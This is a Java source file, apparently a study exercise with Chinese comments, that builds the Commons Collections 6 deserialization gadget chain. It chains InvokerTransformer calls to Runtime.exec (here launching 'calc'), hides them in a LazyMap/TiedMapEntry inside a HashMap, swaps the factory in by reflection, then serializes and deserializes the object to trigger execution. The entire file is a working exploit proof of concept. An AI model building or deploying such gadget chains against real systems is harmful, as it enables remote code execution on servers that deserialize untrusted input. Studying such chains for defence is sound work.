package com.study;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6test {




    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashMap= new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(1)); //这里先放个没啥用的东西
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"test");

        lazyMap.remove("test");
        // 反射
        Class c = lazyMap.getClass();
        Field declaredField = c.getDeclaredField("factory");
        declaredField.setAccessible(true);
        declaredField.set(lazyMap,chainedTransformer); //这里在给它改回正确的

        serialize(map2);
        unserialize("ser.bin");
    }

    // 序列化
    public static void serialize(Object obj)throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    // 反序列化
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }


}
